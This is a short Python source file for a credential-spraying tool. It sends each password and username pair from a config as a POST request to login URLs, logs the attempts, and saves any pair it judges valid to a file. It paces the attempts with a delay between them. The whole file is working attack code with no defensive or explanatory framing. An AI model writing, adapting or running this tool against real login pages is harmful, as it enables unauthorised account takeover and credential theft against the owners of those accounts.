import requests
import time

class CredentialSprayer:
    def __init__(self, config, logger):
        self.targets = config.get("targets", [])
        self.usernames = config.get("usernames", [])
        self.passwords = config.get("passwords", [])
        self.delay = config.get("delay", 5)
        self.max_attempts = config.get("max_attempts", 3)
        self.logger = logger

    def run(self):
        self.logger.info(f"Starting credential spray: {len(self.usernames)} users x {len(self.passwords)} passwords")
        for target in self.targets:
            for password in self.passwords:
                for username in self.usernames:
                    try:
                        self.logger.info(f"Trying {username}:{password} on {target}")
                        res = requests.post(target, data={"username": username, "password": password}, timeout=10)
                        if res.status_code == 200 and "Invalid" not in res.text:
                            self.logger.info(f"[+] SUCCESS on {target}: {username}:{password}")
                            with open("output/valid.txt", "a") as out:
                                out.write(f"{username}:{password}\n")
                        else:
                            self.logger.info(f"[-] Failed: {username}:{password}")
                    except Exception as e:
                        self.logger.warning(f"[!] Error: {e}")
                    time.sleep(self.delay)
